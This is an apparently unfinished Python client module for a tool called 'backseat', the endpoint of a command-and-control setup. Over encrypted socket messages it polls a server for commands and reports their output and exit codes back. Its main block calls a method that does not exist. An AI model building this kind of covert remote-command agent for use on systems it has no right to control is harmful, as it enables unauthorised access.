import socket

import time

import json

from backseat_endpoint import client_message

from shared import asym_cryptography_handler as crypto

class Client:
	encoding = "utf-8"
	msg_byte_len = 1024
	def __init__(self, ip, port):
		self._ip = ip
		self._port = port
		self._client = socket.socket()

			# more resilience needs to be built into the program for things like this
		self._client_msg = client_message.ClientMessage()
		self._crypto_module = crypto.AsymmetricCryptographyHandler()

	def connect(self):
		#this needs to be moved into its own function
		try:
			self._client.connect((self._ip, self._port))
			return True
		except:
			print("Cannot connect to server, server is probably off")
			return False

	def get_command(self):
		#whoami, ping, ready, completed, stdout, stderr, successful, exit_code, command_id
		self._client_msg.add_data("localhost", True, True, True,"", "", False, 0, 0)
		self.send()
		res = self.recieve()
		if res == None:
			print("get_command failed")
			return None
		else:
			return res


#Add encrpytion!!!
	def send(self):
		message = self._client_msg.to_json()
		cyphertext = self._crypto_module.encrypt(message)
		# print(cyphertext)
		cyphertext = str(cyphertext) + "|"
		print(cyphertext)
		try:
			byte_msg = bytes(cyphertext, Client.encoding)
			print(f"byte_msg:\n{byte_msg}")
			self._client.send(byte_msg)
		except:
			print("Failed to send")

	def recieve(self):
		raw_res = " "
		try:
			while raw_res[-1] != "|":
				if raw_res == " ":
					raw_res = ""
				raw_res += self._client.recv(Client.msg_byte_len).decode(Client.encoding)
			cyphertext = raw_res.replace("|", "")
			res = self._crypto_module.decrypt(cyphertext)
			# print(res)
			dict_res = json.loads(res)
			return dict_res
		except:
			print("Failed to recieve")
			return None

	def send_results(self, command_id, exit_code, stdout, stderr=""):
		# whoami, ping, ready, completed, stdout, stderr, successful, exit_code, command_id
		self._client_msg.add_data("localhost", False, True, True, stdout, stderr, True, exit_code, command_id)
		try:
			self.send()
		except:
			print("send_results: Failed")

if __name__ == "__main__":
	c = Client("localhost", 9999)

		# try:
	c.connect()
	c.send_recv("")


		# except:
		# 	print("Error in message sending, waiting 10 seconds before trying again")
		# 	time.sleep(10)
